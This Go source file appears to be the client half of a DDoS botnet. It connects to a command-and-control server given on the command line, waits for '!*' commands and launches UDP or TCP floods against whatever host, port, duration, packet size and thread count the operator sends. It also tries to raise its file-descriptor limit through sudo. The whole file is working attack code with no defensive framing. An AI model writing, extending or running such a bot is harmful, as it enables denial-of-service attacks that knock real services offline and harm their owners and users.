package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"bot/TCP"
	"bot/UDP"
)

var Server net.Listener

func main() {
	go Connect()
	go Ulimit()
	select {}
}

func Connect() {
	con, err := net.Dial("tcp", os.Args[1])
	if err != nil {
		panic(err)
	}
	go BotHandler(con)
}

func BotHandler(conn net.Conn) {
	buffer := make([]byte, 1024)
	for {
		n, err := conn.Read(buffer)
		if err != nil {
			return
		}
		go HandleInput(string(buffer[:n]))
	}
}

func HandleInput(input string) {
	if len(strings.Split(input, " ")) < 2 {
		return
	}
	cmd := strings.Split(input, "\r\n")[1]
	prefix := strings.Split(cmd, " ")[0]
	commands := strings.Split(cmd, " ")[1:]
	fmt.Print(prefix)
	if prefix == "!*" {
		switch commands[0] {
		case "UDP":
			if len(commands) < 7 {
				return
			}
			host := commands[1]
			port := commands[2]
			duration, _ := strconv.Atoi(commands[3])
			size, _ := strconv.Atoi(commands[5])
			threads, _ := strconv.Atoi(commands[6])
			ctxTimeout, cancel := context.WithTimeout(context.Background(), time.Second*time.Duration(duration))
			defer cancel()
			go UDP.Run(ctxTimeout, host+":"+port, size, duration, threads)
			fmt.Print("Flooded " + host + ":" + port + " with UDP for " + strconv.Itoa(duration) + " seconds\r\n")
			break
		case "TCP":
			if len(commands) < 7 {
				return
			}
			host := commands[1]
			port := commands[2]
			duration, _ := strconv.Atoi(commands[3])
			size, _ := strconv.Atoi(commands[5])
			threads, _ := strconv.Atoi(commands[6])
			ctxTimeout, cancel := context.WithTimeout(context.Background(), time.Second*time.Duration(duration))
			defer cancel()
			go TCP.Run(ctxTimeout, host+":"+port, size, duration, threads)
			fmt.Print("Flooded " + host + ":" + port + " with TCP for " + strconv.Itoa(duration) + " seconds\r\n")
			break
		}
	}
}

func Ulimit() {
	cmd := exec.Command("sudo", "ulimit", "-n", "999999")
	cmd.Run()
}
